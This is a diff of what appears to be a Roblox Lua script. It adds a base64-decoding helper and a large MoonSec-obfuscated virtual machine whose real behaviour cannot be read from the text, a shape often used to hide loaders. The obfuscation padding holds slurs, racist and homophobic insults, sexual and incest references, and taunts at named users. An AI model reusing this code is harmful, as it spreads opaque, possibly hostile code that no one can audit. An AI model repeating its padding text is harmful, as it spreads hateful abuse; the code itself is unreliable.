@@ -1,6 +1,813 @@
-_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
 
 
-,nil,nil;(function() _msec=(function(e,l,o)local L=l["   ​           "];local R=o[e[(0x916d/59)]][e["         ​   "]];local g=(131-0x7f)/(-0x63+((291+-0x25)-0x99))local u=(-#'Hey skid'+(0x456/((-#'moonsec is better then my ass'+(0x792/6))-0xb7)))-(0x71-112)local I=o[e[(355-0xe6)]][e["         ​        "]];local m=((((7721175/(0x114+-31))/191)-104)+-#"Its not hip hop its pop cause I found a hella way to fuse it")+(0x45-67)local M=o[e[(((-0x76+119223)+-#"hypeblox likes sucking big black cock")/0xce)]][e["        ​   "]]local d=(0x34/26)-(42-(-#[[i fucked your dad]]+(13630/(327+-0x5c))))local _=((-#{'nil';47,'}';",";47,89;(function()return{','}end)()}+81)-70)local N=(100-(13728/((0x34c-471)-230)))local B=(((0x82b60/(0x3078/94))/78)/0xd)local C=(0x45-(-#'hi momma teach me how to make incest'+((158+-#{1;10;'}',20;'nil'})+-52)))local D=((15652/(179+-#{'}';167;(function()return#{('pPhKmh'):find("\104")}>0 and 1 or 0 end);'nil';167,167;87}))+-#'MSC 793z487nhvcgsdfgsudfza9889jgvz56gz56z547684z5g54z948g56z74j56475jzg645z6456 oh wait')local S=((((0x8269/55)-0x15f)-0x9b)-0x61)local s=(((0x4e80/((-#{{},(function()return#{('KOfoKP'):find("\102")}>0 and 1 or 0 end),(function()return{','}end)();(function()return#{('KOfoKP'):find("\102")}>0 and 1 or 0 end);'nil';{},(function()return{','}end)()}+27639)/176))+-#"aint you nathaniel b")-105)local O=(-#'algebra'+(0x4c-(0x62+(-#[[You say is ricochetin off of me and itll glue to you and]]+((0x1e-59)+0x35)))))local f=((((-0x17d513/(10605/0x65))/175)+-#"how to join the kkk")+0x6b)local w=((-#"Gay porn"+(0x7f5c/(-#{'nil',10;(function()return#{('LhpokO'):find("\112")}>0 and 1 or 0 end);62,{};10;{}}+73)))/0xa2)local U=((0x1b6-((((0x9+-19)+-#'nicuse is nil skull')+0x18a)+-#[[That meme string already exists and also You said a blacklisted word so you are getting banned and kicked and never come back]]))/0x42)local x=(0x5e-(((0x239-(0xf8b0/184))+-#[[mike litoris]])+-0x78))local h=(-108+((336+((-0x68+-3559)/37))-127))local k=(-0x3d+(0xb0-(199+(-0xf1e/45))))local t=((0x1d38/((-0x153/3)+249))+-53)local b=(-#{'nil';158;'}','}',64}+7)local c=(0x1a2/(0xfe+(((-8848+-0x4d)/0xff)+-#[[paidlancer]])))local i=(0x1c/((0x7e+((-45949+0x5987)/245))+-#[[Se men is so tasty]]))local q=e[(-#{(function()return#{('HhMFHP'):find("\77")}>0 and 1 or 0 end);(function()return{','}end)(),'}','}'}+1348)];local Y=o[e[(307-0xb6)]][e["        ​ "]];local H=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('        ')..'\109\101'..('\116\97'or'       ​')..e[(61268/0x6a)]];local F=o[e[(0x4c7-645)]][e["        "]];local v=(-#{1,{},'nil';'nil',85;(function()return#{('bopbbl'):find("\112")}>0 and 1 or 0 end);","}+9)-((1248/((-#'game players kick localplayer kicked by nicuse and beliveri12 ahhahahahahahhaha'+(-0x6a+107))+126))+-#'Big hairy logs are yummy')local p=(98-(210-(14250/0x7d)))-(338/0xa9)local T=o[e[(128+-#{",";'}',1})]][e["          ​       "]];local n=function(e,o)return e..o end local j=(-#"python"+(0x54-74))*((-#"beliveri12 is gay"+((-0x30228/(-0x32+156))/31))+81)local K=o[e["    ​    "]];local a=(374/0xbb)*(-#'elbicho'+((-#'why 6 hours cooldown to send a meme strings'+(28335+((-0x65+54)+-#[[testing this thingy lololollez]])))/209))local A=(2109-0x43d)*(((17013/(0xb5+-22))+-#[[mstir mid]])-0x60)local J=(((((-203+0x54)+329)+-#"you get no absolute bitches")-0x6c)+-#'Tomathoust6969 was here')local y=(70-((0xb98/14)-0x90))*(-0x4c+78)local P=o[e["   ​         "]]or o[e[(673+(-0x34+-43))]][e["   ​         "]];local r=((634-(-#"fico éreto para mulheres japonesas"+(0x1b4+(-#[[paidlancer]]+(-48+0xa)))))+-#[[Big hairy logs are yummy]])local e=o[e["   ​           "]];local z=(function(n)local r,l=3,0x10 local o={j={},v={}}local a=-d local e=l+u while true do o[n:sub(e,(function()e=r+e return e-u end)())]=(function()a=a+d return a end)()if a==(j-d)then a=""l=v break end end local a=#n while e<a+u do o.v[l]=n:sub(e,(function()e=r+e return e-u end)())l=l+d if l%g==v then l=p F(o.j,(T((o[o.v[p]]*j)+o[o.v[d]])))end end return M(o.j)end)("..:::MoonSec::..                ​      ​                 ​      ​  ​                 ​                                              ​  ​ ​  ​                              ​                              ​  ​                 ​              ​  ​               ​                         ​​                                              ​  ​                                        ​                                              ​                        ​                               ​ ​                        ​     ​                     ​               ​                               ​     ​                    ​  ​                         ​  ​                            ​         ​     ​​                            ​  ​                        ​                        ​                          ​                              ​               ​                                 ​                     ​                                ​  ​            ​        ​   ​                                                                                   ​                       ​                   ​                          ​                  ​​         ​         ​                      ​​         ​                           ​  ​  ​    ​            ​                   ​  ​     ​                 ​          ​                 ​                     ​      ​     ​  ​   ​​           ​                             ​                                        ​                                         ​           ​              ​                     ​   ​         ​  ​     ​             ​                                                                                                     ​          ​              ​                ​                   ​             ​   ​                                ​ ​       ​                                              ​                       ​                                 ​                  ​           ​                                         ​        ​  ​                 ​                                      ​                           ​             ​                    ​      ​                     ​                ​                               ​​        ​  ​               ​       ​                                  ​     ​               ​                     ​                    ​  ​            ​         ​                                       ​        ​                         ​                          ​                        ​           ​ ​                                   ​                   ​      ​               ​      ​    ​                       ​  ​                                        ​          ​                 ​                 ​          ​                          ​                                 ​                               ​            ​                         ​​    ​​                             ​                             ​                   ​                      ​       ​     ​                            ​    ​    ​                                      ​                       ​    ​    ​                     ​      ​                            ​               ​              ​                                  ​         ​                               ​                           ​     ​                    ​                 ​                                     ​                                ​​ ​     ​                  ​      ​       ​                       ​              ​​                          ​​         ​                                ​                                      ​                             ​                              ​                       ​           ​              ​                           ​       ​    ​    ​                        ​   ​     ​             ​   ​   ​            ​           ​                          ​                              ​             ​                    ​              ​                                                                                ​​                                ​                                 ​                                ​​    ​                                                  ​          ​                     ​              ​     ​                    ​        ​                                                        ​           ​               ​                                                                                       ​              ​              ​        ​                               ​                                         ​                ​                ​   ​                     ​                                ​                         ​                      ​              ​                                                              ​                      ​        ​                ​              ​       ​  ​                                                                ​             ​                        ​                       ​                     ​          ​                 ​​                          ​                 ​            ​                               ​           ​  ​        ​                  ​                    ​            ​                             ​                             ​                                                                ​             ​    ​                    ​                              ​      ​                      ​                                                           ​           ​     ​                 ​  ​                                 ​            ​            ​            ​                                 ​           ​               ​      ​           ​         ​         ​   ​                  ​​            ​                                                  ​   ​          ​      ​         ​      ​             ​  ​          ​                       ​​                  ​            ​                         ​                ​​                                 ​       ​               ​                      ​                   ​    ​   ​           ​​                       ​                               ​          ​                   ​         ​        ​                                              ​              ​           ​                    ​                            ​       ​                ​   ​                   ​     ​                         ​                       ​                        ​  ​                            ​​    ​                   ​      ​                                           ​              ​                 ​​​               ​     ​ ​              ​                         ​           ​                                          ​                          ​                                  ​                         ​      ​                             ​            ​       ​                   ​ ​  ​                       ​                 ​    ​                      ​             ​             ​  ​                  ​ ​         ​             ​                  ​                                                                                                      ​             ​      ​               ​                               ​            ​                 ​                       ​​ ​                 ​                                   ​        ​   ​         ​      ​                                                       ​  ​                  ​   ​                  ​                 ​                                       ​                        ​    ​            ​     ​  ​           ​                            ​    ​                ​ ​    ​           ​   ​     ​       ​                        ​​                                                             ​            ​​​    ​                 ​                  ​                          ​       ​                             ​                           ​         ​    ​                         ​ ​                           ​      ​                    ​                    ​         ​          ​                              ​                         ​                          ​    ​           ​         ​                ​ ​                            ​        ​                    ​       ​                                                    ​                                                                           ​                       ​          ​             ​    ​                ​      ​         ​                   ​                                    ​  ​                               ​  ​                          ​            ​          ​  ​                         ​                   ​                           ​                                                        ​​    ​                                   ​                                    ​ ​                    ​               ​ ​           ​                            ​​                                   ​                                                                                         ​           ​             ​  ​                              ​            ​                        ​    ​                                ​                         ​        ​ ​          ​   ​                   ​    ​                                    ​          ​ ​                        ​  ​                           ​                          ​                                                         ​                    ​                ​        ​             ​             ​                                      ​                                ​   ​​                                        ​                ​                        ​         ​                    ​    ​      ​                                ​                              ​        ​                                ​               ​             ​        ​                                    ​           ​                        ​                              ​    ​                                            ​                                       ​                          ​    ​                              ​​ ​                        ​   ​  ​                                    ​​                                      ​                  ​                   ​       ​                             ​          ​                             ​                          ​                             ​                         ​          ​           ​                                       ​                                      ​  ​                               ​    ​ ​                   ​                         ​                 ​                             ​         ​               ​      ​                   ​       ​                    ​      ​                                    ​​                               ​          ​                  ​                  ​     ​​                             ​                                       ​                               ​                                                     ​                                           ​              ​                              ​           ​                                ​    ​            ​                         ​                                 ​        ​                  ​                                                         ​​                             ​                         ​                             ​            ​          ​                                  ​                                   ​            ​                ​         ​    ​                 ​             ​                       ​          ​     ​        ​                                                ​                  ​        ​                                  ​                     ​    ​                    ​                ​                                          ​                 ​​                 ​      ​                               ​                                    ​     ​   ​                                        ​                                          ​         ​                  ​                          ​                                        ​    ​                                   ​  ​                   ​     ​          ​     ​        ​                      ​                                    ​     ​     ​                           ​ ​          ​                                                              ​​                          ​  ​         ​       ​                  ​         ​           ​                    ​​                      ​                  ​     ​                              ​​                                        ​     ​         ​                        ​                                                                     ​  ​                              ​                                    ​   ​              ​                         ​    ​ ​         ​​               ​  ​        ​     ​                        ​  ​                                      ​     ​                                                         ​           ​                                         ​​                        ​  ​​     ​                                ​                                     ​​                   ​        ​          ​​    ​                              ​      ​                               ​     ​                  ​   ​                                   ​                           ​                        ​                          ​            ​​        ​                ​    ​                            ​     ​  ​                             ​    ​                                       ​                               ​        ​                                     ​                                 ​​                                                ​                     ​​                             ​          ​​             ​    ​           ​      ​       ​                            ​                          ​              ​                                      ​  ​       ​   ​            ​                           ​                    ​                   ​                                                         ​                              ​    ​                                    ​           ​                  ​       ​                    ​                ​                       ​             ​           ​                  ​                             ​                                  ​    ​                       ​                  ​       ​​                              ​                                      ​                                         ​                       ​          ​                                                                                               ​                                         ​              ​                            ​   ​         ​                    ​​              ​                     ​               ​     ​   ​                    ​      ​           ​              ​       ​                                    ​​                           ​      ​                    ​                 ​         ​                                                                        ​                             ​  ​                         ​             ​                ​                    ​       ​  ​                        ​     ​ ​         ​                      ​  ​          ​                 ​    ​                                  ​                              ​        ​                    ​                          ​                         ​                                      ​                                    ​  ​​                            ​         ​                  ​                    ​      ​​                             ​                                         ​                        ​   ​  ​       ​                 ​             ​        ​       ​                                                                                               ​                      ​    ​                    ​                                                                ​                  ​    ​           ​                          ​                         ​         ​   ​                  ​            ​​                             ​          ​        ​          ​                  ​       ​                             ​                                     ​    ​                           ​​  ​                        ​                        ​                       ​                     ​                               ​                       ​     ​        ​                  ​            ​               ​         ​    ​       ​                                                  ​                ​           ​            ​​                                          ​  ​           ​        ​                  ​                                    ​                               ​        ​       ​                                                                  ​                    ​                 ​  ​              ​           ​          ​              ​                    ​                   ​                             ​                         ​  ​                           ​                                           ​                              ​       ​                    ​                ​         ​                           ​​                         ​                                          ​                                        ​                                       ​             ​           ​          ​     ​      ​                      ​                                     ​  ​       ​                ​                           ​                                              ​              ​            ​                              ​           ​                ​         ​    ​                        ​              ​           ​                            ​                                   ​                                                                   ​  ​                           ​                                  ​     ​           ​                    ​                                   ​          ​                                ​                            ​                                       ​             ​                      ​                    ​           ​  ​           ​                         ​  ​          ​                 ​    ​                                      ​       ​                       ​        ​                    ​                ​                                                     ​                    ​      ​                  ​                     ​            ​                   ​                                         ​             ​      ​​                      ​                                       ​ ​                                    ​                                  ​           ​      ​      ​     ​                                   ​                      ​                       ​          ​                 ​      ​       ​                ​  ​                               ​           ​   ​                           ​                                                  ​   ​                                                          ​       ​                 ​   ​                       ​              ​       ​       ​                                                                  ​                           ​  ​            ​          ​                    ​                                                ​ ​                           ​                        ​                              ​  ​    ​           ​                    ​                                     ​            ​      ​   ​                                                ​         ​   ​                ​  ​            ​     ​              ​                ​                                       ​​            ​                 ​                 ​                                                                     ​                            ​  ​                         ​ ​                      ​                       ​                   ​​                ​             ​                         ​  ​                             ​    ​                        ​              ​                            ​                                       ​       ​         ​                        ​                  ​        ​      ​                                 ​​                             ​          ​                   ​                ​       ​                               ​     ​                             ​    ​                           ​  ​                                   ​              ​                                         ​                        ​   ​                        ​  ​                              ​    ​                          ​       ​       ​       ​                       ​        ​     ​                             ​         ​                          ​                                       ​                                  ​​             ​             ​          ​                  ​        ​          ​     ​​                            ​​ ​     ​   ​                              ​    ​​                          ​                                                       ​                                   ​        ​              ​           ​​                         ​  ​                            ​    ​                                     ​       ​                       ​        ​     ​                                        ​           ​                 ​                      ​​                           ​                     ​​                           ​          ​​                ​                  ​                                       ​    ​                                    ​​                            ​                         ​​                            ​                                             ​       ​   ​  ​       ​   ​                         ​  ​                              ​  ​ ​                      ​     ​       ​       ​                      ​                             ​                            ​                           ​                       ​                                              ​​                           ​         ​   ​​                ​                    ​       ​                                 ​                                     ​                               ​  ​                        ​                         ​                                          ​       ​       ​                                     ​  ​                              ​    ​                                      ​                             ​        ​                     ​                                                           ​                           ​      ​            ​                                                ​          ​                                       ​       ​     ​                       ​                                       ​                                ​  ​                        ​                                                               ​                                ​                        ​                               ​    ​    ​                               ​                             ​        ​                  ​                                                        ​​                                                                  ​   ​​                   ​    ​             ​                  ​                    ​                                    ​         ​                              ​    ​​                          ​  ​                        ​           ​                                   ​                   ​                          ​                         ​   ​                         ​    ​       ​                           ​                               ​        ​     ​         ​     ​                                                          ​                                                    ​              ​                            ​            ​       ​                          ​                                       ​         ​                    ​         ​    ​​                            ​  ​       ​                ​          ​                ​                                     ​                             ​                          ​  ​        ​                  ​    ​                                                                  ​       ​                   ​                      ​    ​                            ​                                   ​                                                                                                        ​ ​       ​                                    ​                                        ​    ​                               ​  ​                          ​          ​                                      ​     ​​                           ​      ​     ​                           ​  ​  ​                          ​    ​                                                                         ​     ​             ​            ​      ​     ​  ​                    ​​          ​                       ​                                   ​​                            ​          ​                   ​                           ​                                                                    ​       ​​               ​                                        ​          ​     ​                                      ​               ​              ​            ​                          ​                              ​    ​                      ​                                 ​         ​                                                      ​      ​                                             ​   ​              ​                                                ​      ​                                                                           ​                                    ​    ​                            ​                           ​  ​           ​              ​                      ​    ​       ​        ​              ​            ​                         ​  ​                              ​    ​                                   ​                             ​                               ​                ​         ​                           ​​                                   ​              ​                                                                              ​                  ​       ​                              ​                                      ​    ​​                            ​                             ​          ​                                           ​    ​                     ​           ​                           ​  ​                   ​         ​                                                 ​                                 ​       ​     ​            ​                   ​         ​                            ​                                          ​​                                                       ​          ​                 ​         ​      ​       ​                            ​                                     ​    ​              ​              ​  ​                           ​         ​​               ​                                          ​​                           ​                                                            ​    ​                                  ​  ​         ​                           ​                   ​                ​          ​                          ​​                          ​       ​                    ​                     ​ ​                              ​                 ​                   ​         ​         ​       ​​​        ​                                      ​                                 ​  ​                            ​          ​     ​        ​                                                                                      ​               ​                                ​                                    ​  ​                          ​                           ​                  ​          ​                         ​​                                                                                                          ​            ​                                 ​ ​        ​                            ​                                     ​    ​​                            ​                                               ​          ​     ​               ​            ​                 ​                        ​            ​                                                   ​                        ​            ​                              ​        ​                                                ​                         ​​                                                                       ​​                           ​          ​                  ​                ​       ​                ​​          ​                                                             ​              ​                                                             ​  ​                                         ​                                                        ​  ​                             ​  ​ ​                                  ​                             ​        ​                    ​                  ​                                                                                                          ​​                  ​         ​            ​                                        ​​            ​               ​                                             ​                            ​        ​                    ​          ​             ​                                                      ​                         ​         ​      ​                                      ​                                              ​                                           ​                  ​                ​          ​                              ​​                                      ​     ​                                ​​                            ​          ​                  ​                      ​                                                                   ​         ​                      ​              ​                        ​          ​             ​                      ​                     ​              ​ ​          ​                        ​  ​                        ​     ​                               ​ ​       ​              ​ ​               ​​                    ​ ​      ​                  ​ ​                      ​         ​    ​                                                       ​ ​   ​         ​                     ​          ​                ​                      ​   ​                            ​             ​                          ​         ​                   ​  ​                        ​          ​             ​​                      ​     ​                                ​           ​                             ​                            ​    ​                           ​          ​       ​                    ​                          ​   ​        ​               ​       ​    ​             ​                                       ​ ​           ​                                   ​       ​    ​               ​                ​                ​                ​         ​                                  ​     ​​                       ​                          ​          ​      ​          ​                    ​                                ​                                     ​                                 ​                                         ​                       ​                                                                         ​                          ​                     ​ ​​      ​                                   ​​                                ​​                        ​     ​          ​      ​                ​         ​   ​         ​                                                      ​             ​                    ​                 ​                                                         ​                  ​                 ​       ​                  ​            ​                                 ​   ​       ​  ​                             ​                           ​            ​           ​                                ​                            ​                            ​                   ​        ​ ​           ​                             ​   ​                                              ​                 ​           ​               ​                                 ​  ​    ​  ​        ​                           ​                ​                     ​             ​              ​     ​     ​                            ​                           ​                                        ​                                        ​                   ​                 ​          ​  ​                        ​​                                   ​                                   ​                                     ​                ​                                                  ​                                         ​    ​             ​              ​  ​                         ​          ​ ​               ​    ​       ​          ​                                   ​             ​                        ​​  ​                               ​    ​          ​                                                                                                  ​    ​    ​                           ​                               ​         ​                   ​               ​​                    ​       ​        ​          ​      ​                   ​       ​                                                                  ​                             ​                             ​              ​               ​          ​             ​                    ​              ​                                    ​  ​                                  ​    ​                 ​              ​                             ​  ​                                        ​             ​                          ​                           ​        ​            ​                    ​​                           ​          ​ ​                ​             ​      ​       ​                                ​               ​            ​          ​  ​​                        ​                              ​                                                 ​                     ​              ​                                          ​    ​                           ​   ​    ​                      ​​           ​                            ​                              ​                          ​          ​              ​​                          ​          ​                                ​​                          ​          ​                 ​        ​          ​     ​​                             ​                                    ​    ​                         ​                                                        ​                                                ​​           ​  ​        ​  ​                         ​  ​                            ​    ​                      ​               ​                              ​      ​                   ​                     ​    ​                               ​                                         ​                                ​​                            ​          ​           ​                       ​       ​           ​                 ​                                        ​    ​                          ​  ​                        ​         ​                 ​                                           ​                          ​                       ​  ​                              ​                                ​                          ​              ​  ​             ​          ​            ​     ​ ​  ​                    ​                          ​                                                                                                 ​           ​   ​    ​                    ​                                   ​         ​                                ​                            ​                                      ​             ​          ​           ​                    ​           ​  ​           ​                           ​  ​                              ​    ​                      ​      ​       ​       ​                       ​        ​                  ​       ​      ​              ​                      ​       ​                       ​      ​        ​​                 ​ ​      ​                   ​                         ​         ​                           ​   ​   ​                    ​                                      ​    ​                                ​  ​                          ​          ​                                  ​                   ​                           ​                         ​  ​                               ​    ​   ​                               ​                             ​        ​                    ​                ​         ​                             ​       ​          ​      ​ ​​          ​                     ​          ​             ​             ​      ​                     ​      ​       ​          ​                                    ​        ​            ​           ​                             ​  ​         ​                                ​            ​            ​          ​    ​                                              ​                                                       ​    ​                                   ​                                      ​                   ​                ​          ​                           ​​                                          ​                                 ​  ​​​                            ​          ​                   ​                   ​       ​                           ​                                           ​                            ​​  ​                          ​                        ​                      ​    ​                                  ​          ​     ​                         ​                                                                          ​                ​                    ​             ​                       ​           ​                    ​         ​     ​                              ​                                          ​                                  ​               ​                         ​                                                          ​      ​    ​                             ​  ​                          ​          ​              ​                      ​                    ​                          ​                  ​ ​        ​     ​                        ​                                                                                                  ​              ​           ​            ​​                              ​                     ​                  ​            ​​                                                      ​                ​       ​              ​        ​     ​            ​                        ​                                 ​  ​                          ​          ​                         ​       ​                    ​                           ​                ​           ​                              ​    ​                                   ​  ​  ​                                                          ​    ​           ​            ​                              ​   ​  ​        ​                 ​                                   ​                            ​          ​                                ​ ​      ​                            ​                                     ​    ​                     ​                                  ​        ​                ​                                          ​                             ​                         ​  ​                          ");local M=(112+-#{'nil';1;'nil';1,62})local o=90 local l=d;local e={}e={[(0x3f+-62)]=function()local n,i,d,e=I(z,l,l+m);l=l+y;o=(o+(M*y))%r;return(((e+o-(M)+a*(y*g))%a)*((g*A)^g))+(((d+o-(M*g)+a*(g^m))%r)*(a*r))+(((i+o-(M*m)+A)%r)*a)+((n+o-(M*y)+A)%r);end,[(68/(6256/0xb8))]=function(e,e,e)local e=I(z,l,l);l=l+u;o=(o+(M))%r;return((e+o-(M)+A)%a);end,[(84-0x51)]=function()local d,e=I(z,l,l+g);o=(o+(M*g))%r;l=l+g;return(((e+o-(M)+a*(g*y))%a)*r)+((d+o-(M*g)+r*(g^m))%a);end,[(-0x1c+32)]=function(o,e,l)if l then local e=(o/g^(e-d))%g^((l-u)-(e-d)+u);return e-e%d;else local e=g^(e-u);return(o%(e+e)>=e)and d or p;end;end,[(315/0x3f)]=function()local o=e[(-#"legend says i was here"+((589+-0x25)/0x18))]();local n=e[((0x1df6/65)+-#"Ok guys relax Theyre just fucking socks Its impossible for socks to turn me gay My heterosexuality will be fine dudes")]();local i=d;local l=(e[(-95+0x63)](n,u,j+y)*(g^(j*g)))+o;local o=e[(0x214/133)](n,21,31);local e=((-d)^e[(21+(-#'when the he went where when he where where when the he when ther wher he then here went'+(-89+0x9f)))](n,32));if(o==p)then if(l==v)then return e*p;else o=u;i=v;end;elseif(o==(a*(g^m))-u)then return(l==p)and(e*(u/v))or(e*(p/v));end;return R(e,o-((r*(y))-d))*(i+(l/(g^J)));end,[(-#'jjsplot on top'+(74+-0x36))]=function(n,i,i)local i;if(not n)then n=e[(93+-0x5c)]();if(n==p)then return'';end;end;i=Y(z,l,l+n-d);l=l+n;local e=''for l=u,#i do e=q(e,T((I(Y(i,l,l))+o)%r))o=(o+M)%a end return e;end}local function p(...)return{...},K('#',...)end local function z()local c={};local h={};local o={};local n={c,h,nil,o};local l={}local t=((0x8b-100)+-#"Impulse youtube real")local o={[(42-0x27)]=(function(o)return not(#o==e[(101-0x63)]())end),[(-22+0x18)]=(function(o)return e[(86+-0x51)]()end),[(-70+0x4a)]=(function(o)return e[(-#"this video is sponsored by manscaped your balls will thank you"+(0x90+-76))]()end),[((0/0x82)/0x2b)]=(function(o)local d=e[(-88+0x5e)]()local e=''local o=1 for l=1,#d do o=(o+t)%r e=q(e,T((I(d:sub(l,l))+o)%a))end return e end)};local a=e[(-0x1c+29)]()for d=1,a do local e=e[(0x24/(0x85-115))]();local a;local e=o[e%((0x7a-106)+-#"Bwomp")];l[d]=e and e({});end;for n=1,e[(109+(-112+0x4))]()do local o=e[(34-0x20)]();if(e[(44/0xb)](o,d,u)==v)then local r=e[((0xc2-143)+-#"funtime foxy and funtime freddy having sex real")](o,g,m);local a=e[(-108+0x70)](o,y,g+y);local o={e[(23+-0x14)](),e[(339/0x71)](),nil,nil};local h={[((638/0x16)+-#'Only a to Z 0 to 9 is allowed')]=function()o[x]=e[((128-0x69)+-#[[Impulse youtube real]])]();o[S]=e[(-#"Rip Technoblade but he truly never dies in our hearts"+(-105+0xa1))]();end,[(19-0x12)]=function()o[w]=e[((0x72+-99)+-#"sexo 4 o filme")]();end,[(94-0x5c)]=function()o[x]=e[(0x56-85)]()-(g^j)end,[(435/0x91)]=function()o[w]=e[(0x25+-36)]()-(g^j)o[B]=e[(312/0x68)]();end};h[r]();if(e[(-50+0x36)](a,u,d)==u)then o[b]=l[o[i]]end if(e[(980/(0xb2f7/187))](a,g,g)==d)then o[U]=l[o[U]]end if(e[(-0x24+40)](a,m,m)==u)then o[N]=l[o[C]]end c[n]=o;end end;n[3]=e[(-25+0x1b)]();for e=u,e[(33/0x21)]()do h[e-u]=z();end;return n;end;local function v(e,y,M)local j=e[g];local o=e[m];local l=e[d];return(function(...)local z={...};local p=p local r=o;local e=d e*=-1 local m=e;local a=l;local T={};local I={};local A=K('#',...)-u;local l={};local j=j;local o=d;for e=0,A do if(e>=r)then T[e-r]=z[e+u];else l[e]=z[e+d];end;end;local e=A-r+d local e;local r;while true do e=a[o];r=e[((-92+0x6e)-0x11)];n=(1465662)while((149+-0x39)+-#"gay men")>=r do n-= n n=(3565304)while((0x79+-69)+-#[[Give nitro]])>=r do n-= n n=(473110)while((0xe0-142)+-#[[this video is sponsored by manscaped your balls will thank you]])>=r do n-= n n=(176064)while(0x56-77)>=r do n-= n n=(858078)while((0x60-86)+-#'shlong')>=r do n-= n n=(11052376)while(213/0xd5)>=r do n-= n n=(824820)while(0/0x5f)<r do n-= n local n;l[e[t]]=M[e[s]];o=o+d;e=a[o];n=e[i]l[n]=l[n]()o=o+d;e=a[o];l[e[h]][e[x]]=l[e[S]];o=o+d;e=a[o];l[e[c]]=M[e[s]];o=o+d;e=a[o];l[e[t]]();o=o+d;e=a[o];do return end;break end while 233==(n)/(((364662+-0x2a)/103))do l[e[h]]=l[e[x]]%e[C];break end;break;end while(n)/((622288/((-58+0xfd)+-#"MemeStrings")))==3268 do n=(7553975)while r<=((70-(0xb2e/53))+-#[[Moonsex v5 eta]])do n-= n local n;l[e[c]]=l[e[x]][e[N]];o=o+d;e=a[o];l[e[h]]=l[e[w]][e[S]];o=o+d;e=a[o];l[e[h]]=l[e[U]][e[D]];o=o+d;e=a[o];l[e[b]]=l[e[s]][e[S]];o=o+d;e=a[o];l[e[h]]=M[e[f]];o=o+d;e=a[o];l[e[t]]=l[e[s]][e[D]];o=o+d;e=a[o];l[e[i]]=e[O];o=o+d;e=a[o];l[e[c]]=e[w];o=o+d;e=a[o];l[e[b]]=e[s];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];l[e[h]][e[U]]=l[e[N]];o=o+d;e=a[o];o=e[U];break;end while(n)/((-#'arab porn'+(7263-0xe5f)))==2113 do n=(1881768)while(57-0x36)<r do n-= n local r;local n;l[e[b]][e[x]]=e[_];o=o+d;e=a[o];l[e[b]][e[f]]=e[B];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];n=e[c];r=l[e[w]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[h]][e[s]]=e[_];break end while 1461==(n)/((302680/0xeb))do local r;local n;l[e[b]]=l[e[f]][e[N]];o=o+d;e=a[o];l[e[b]]=l[e[f]][e[B]];o=o+d;e=a[o];l[e[b]]=l[e[O]][e[_]];o=o+d;e=a[o];n=e[b];r=l[e[U]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];n=e[c]l[n](l[n+u])o=o+d;e=a[o];l[e[k]]=M[e[x]];o=o+d;e=a[o];l[e[h]]=l[e[f]][e[N]];o=o+d;e=a[o];l[e[b]]();o=o+d;e=a[o];o=e[s];break end;break;end break;end break;end while(n)/(((0xdee+-74)+-#[[nico der hurensohn]]))==247 do n=(1621308)while(1116/0xba)>=r do n-= n n=(485928)while r>((13869/0xcf)+-#"I like watching videos of black men shaking their booty cheeks")do n-= n local d=e[b];local a=l[d]local n=l[d+2];if(n>0)then if(a>l[d+1])then o=e[O];else l[d+3]=a;end elseif(a<l[d+1])then o=e[O];else l[d+3]=a;end break end while(n)/((0x7788/225))==3573 do l[e[h]]=l[e[O]][l[e[S]]];break end;break;end while 2964==(n)/((0x457-564))do n=(3473325)while(1288/0xb8)>=r do n-= n local n;l[e[i]]=l[e[s]][e[S]];o=o+d;e=a[o];l[e[b]]=l[e[s]][e[C]];o=o+d;e=a[o];l[e[t]]=l[e[w]][e[N]];o=o+d;e=a[o];l[e[i]]=l[e[s]][e[N]];o=o+d;e=a[o];l[e[c]]=M[e[s]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[N]];o=o+d;e=a[o];l[e[i]]=e[O];o=o+d;e=a[o];l[e[t]]=e[w];o=o+d;e=a[o];l[e[k]]=e[s];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[h]][e[O]]=l[e[_]];o=o+d;e=a[o];o=e[U];break;end while 1935==(n)/(((0x554e2/190)+-#[[i shoved a whole bag of jellibeans up my ass]]))do n=(802800)while(-#'i would jerk off to federals feet'+(0xd22/82))<r do n-= n local r;local n;l[e[c]][e[w]]=l[e[B]];o=o+d;e=a[o];n=e[h]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[b];r=l[e[w]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[t]][e[s]]=e[S];o=o+d;e=a[o];l[e[i]][e[f]]=e[D];o=o+d;e=a[o];l[e[b]][e[O]]=e[B];break end while(n)/((932+-0x28))==900 do local r;local 